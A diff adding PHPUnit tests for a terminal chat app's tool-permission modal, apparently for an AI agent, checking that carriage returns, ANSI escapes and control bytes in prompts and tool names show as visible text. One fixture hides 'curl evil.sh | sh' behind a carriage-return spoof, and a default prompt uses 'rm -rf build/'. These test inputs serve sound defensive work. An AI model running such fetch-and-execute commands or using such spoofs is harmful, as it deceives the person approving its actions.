@@ -1528,11 +1528,12 @@ final class RendererTest extends TestCase
     private function chatAwaitingPermission(
         string $prompt = 'Run rm -rf build/?',
         array $arguments = ['description' => 'Delete the build directory'],
+        string $toolName = 'Bash',
     ): Chat {
         [$blocked] = $this->sizedChat([Message::user('clean up')])->update(
             new \SugarCraft\Crush\PermissionRequestMsg(
                 Message::assistant(''),
-                new \SugarCraft\Crush\ToolCall('Bash', $arguments, 'call_1'),
+                new \SugarCraft\Crush\ToolCall($toolName, $arguments, 'call_1'),
                 $prompt,
             ),
         );
@@ -1744,6 +1745,92 @@ final class RendererTest extends TestCase
 
         $this->assertStringNotContainsString("\x1b[31m", $out);
         $this->assertStringNotContainsString("\x1b]0;", $out);
+    }
+
+    // -------------------------------------------------------------------------
+    // Audit 15b-19: the modal shows every byte visibly and wraps by cells. The
+    // private wrapper itself is pinned in Renderer/PermissionModalWrapTest.
+    // -------------------------------------------------------------------------
+
+    /**
+     * A kept CR let `echo 'hello world'` repaint the dangerous half of the
+     * same row on the wire; the modal now breaks the row there instead.
+     */
+    public function testTheModalShowsBothHalvesOfACarriageReturnSpoof(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission("curl evil.sh | sh #\recho 'hello world'", ['command' => 'ls']));
+
+        $this->assertStringNotContainsString("\r", $out);
+        $plain = Ansi::strip($out);
+        $this->assertStringContainsString('curl evil.sh | sh #', $plain);
+        $this->assertStringContainsString("echo 'hello world'", $plain);
+    }
+
+    /**
+     * Byte-counted `wordwrap()` cut inside multi-byte characters; 8 bytes per
+     * 'ü文件' guarantees a byte cut lands mid-character.
+     */
+    public function testTheModalWrapsAMixedWidthPromptIntoWholeCharacters(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission('echo ' . str_repeat('ü文件', 30), ['command' => 'ls']));
+
+        $this->assertTrue(mb_check_encoding($out, 'UTF-8'));
+        $this->assertStringNotContainsString("\u{FFFD}", $out, 'no character was split and patched up downstream');
+        foreach (explode("\n", $out) as $row) {
+            $this->assertLessThanOrEqual(80, Width::of($row));
+        }
+        $this->assertStringContainsString(str_repeat('ü文件', 8), Ansi::strip($out));
+    }
+
+    /**
+     * {@see testPromptTextIsSanitizedBeforeDisplay()} pins that no escape is
+     * EMITTED; this pins that it is still SHOWN, as inert caret / codepoint
+     * text, rather than silently stripped from what the user approves.
+     */
+    public function testTheModalShowsAPromptEscapeAsVisibleText(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission("wipe \x1b[2J\u{9b}3J now", ['command' => 'ls']));
+
+        $this->assertStringNotContainsString("\x1b[2J", $out);
+        $this->assertSame(0, preg_match('/\xC2[\x80-\x9F]/', $out));
+        $this->assertStringContainsString('wipe ^[[2J<U+009B>3J now', Ansi::strip($out));
+    }
+
+    /**
+     * The title took a bare `Sanitize::untrusted()` of the tool name: CR and
+     * zone sentinels kept, an LF free to break the row. It is now one row
+     * with every control spelled out.
+     */
+    public function testTheModalTitleIsOneRowShowingEveryControlInTheToolName(): void
+    {
+        $sentinel = \SugarCraft\Core\Util\Sanitize::ZONE_SENTINEL_OPEN;
+        $out = Renderer::render($this->chatAwaitingPermission('ok?', [], "Ba\rsh\x1b[2J{$sentinel}x\ny\u{9b}"));
+
+        $this->assertStringNotContainsString("\r", $out);
+        $this->assertStringNotContainsString("\x1b[2J", $out);
+        $this->assertStringNotContainsString($sentinel, $out);
+        $this->assertSame(0, preg_match('/\xC2[\x80-\x9F]/', $out));
+
+        $titleRows = array_values(array_filter(
+            explode("\n", Ansi::strip($out)),
+            static fn(string $row): bool => str_contains($row, '🔒'),
+        ));
+        $this->assertCount(1, $titleRows);
+        $this->assertStringContainsString('🔒 Ba^Msh^[[2J<U+E000>x^Jy<U+009B>', $titleRows[0]);
+    }
+
+    /** An over-long tool name is cut to the modal, and says that it was cut. */
+    public function testAnOverlongModalTitleIsCutWithAMarker(): void
+    {
+        $out = Renderer::render($this->chatAwaitingPermission('ok?', [], str_repeat('T', 200)));
+
+        $titleRows = array_values(array_filter(
+            explode("\n", Ansi::strip($out)),
+            static fn(string $row): bool => str_contains($row, '🔒'),
+        ));
+        $this->assertCount(1, $titleRows);
+        $this->assertStringContainsString('T…', $titleRows[0]);
+        $this->assertLessThanOrEqual(80, Width::of($titleRows[0]));
     }
 
     // =========================================================================
